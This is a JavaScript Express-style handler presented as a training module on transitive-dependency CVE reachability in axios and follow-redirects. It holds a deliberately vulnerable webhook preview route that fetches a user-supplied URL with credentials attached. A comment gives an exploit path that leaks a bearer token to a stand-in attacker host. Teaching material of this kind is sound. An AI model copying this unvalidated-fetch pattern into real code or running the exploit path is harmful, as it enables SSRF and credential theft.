"use strict";

// -----------------------------------------------------------------------------
// TRAINING MODULE: Transitive Dependency CVE Reachability
// -----------------------------------------------------------------------------
// This module intentionally demonstrates how a CVE in a *transitive* dependency
// becomes reachable — and exploitable — from first-party route code.
//
// Direct dependency:      axios ^1.6.0   (see package.json)
// Transitive dependency:  follow-redirects  ← pulled in by axios <= 1.6.x
//
// Reachable CVEs on this exact call graph:
//
// 1. CVE-2024-28849 (follow-redirects, transitive)
//    Authorization / Proxy-Authorization / Cookie headers are re-sent when
//    the redirect target is on a *different* host, leaking user credentials.
//    Exploit path:
//        GET /api/webhook/preview?url=https://evil.example.com
//        → this handler adds `Authorization: Bearer <session-token>`
//        → axios (direct) delegates to follow-redirects (transitive)
//        → follow-redirects re-attaches the Authorization header to the
//          cross-origin redirect and sends it to evil.example.com
//
// 2. CVE-2023-45857 (axios <1.6.0, direct — kept here for training)
//    XSRF-TOKEN cookie is echoed as X-XSRF-TOKEN header on cross-site requests.
//    Same handler triggers it because the user URL can point anywhere.
//
// 3. CVE-2024-39338 (axios <1.7.4, direct)
//    Absolute / protocol-relative URL bypass in axios internals produces SSRF
//    even when the app "thinks" it prefixed a safe baseURL.
//
// All three are demonstrable from a single first-party entry point below.
// -----------------------------------------------------------------------------

const axios = require("axios");

function WebhookHandler(_db) {

    // Intentionally vulnerable: forwards to a user-supplied URL while sending
    // credentials — exercises the follow-redirects auth-header leak CVE.
    this.previewWebhook = (req, res, next) => {
        const targetUrl = req.query.url;
        if (!targetUrl) {
            return res.status(400).json({ error: "Missing 'url' query parameter" });
        }

        // First-party code adds a credential header. The user URL is not
        // validated against an allowlist, so a redirect to an attacker host
        // will leak this header through the follow-redirects transitive dep.
        const client = axios.create({
            // baseURL is intentionally weak: an absolute or protocol-relative
            // `url` argument bypasses it (CVE-2024-39338 in axios <1.7.4)
            baseURL: "https://api.internal.corp/",
            timeout: 5000,
            maxRedirects: 5,
            headers: {
                Authorization: `Bearer ${req.session.userId || "anon"}-token`,
            },
        });

        client
            .get(targetUrl)
            .then((upstream) => {
                res.json({
                    status: upstream.status,
                    finalUrl: upstream.request && upstream.request.res && upstream.request.res.responseUrl,
                    bodyPreview: String(upstream.data).slice(0, 500),
                });
            })
            .catch((err) => {
                res.status(502).json({
                    error: "Upstream fetch failed",
                    message: err && err.message,
                    finalUrl: err && err.request && err.request.res && err.request.res.responseUrl,
                });
            });
    };

    // Introspection endpoint: reports the exact resolved versions of the
    // direct and transitive deps involved, so tests can assert reachability.
    this.dependencyGraph = (_req, res) => {
        let axiosPkg = {};
        let followRedirectsPkg = {};
        try { axiosPkg = require("axios/package.json"); } catch (_) { }
        try { followRedirectsPkg = require("follow-redirects/package.json"); } catch (_) { }
        res.json({
            direct: { axios: axiosPkg.version || null },
            transitive: { "follow-redirects": followRedirectsPkg.version || null },
            reachableCves: [
                "CVE-2024-28849 (follow-redirects – transitive)",
                "CVE-2023-45857 (axios – direct)",
                "CVE-2024-39338 (axios – direct)",
            ],
        });
    };
}

module.exports = WebhookHandler;
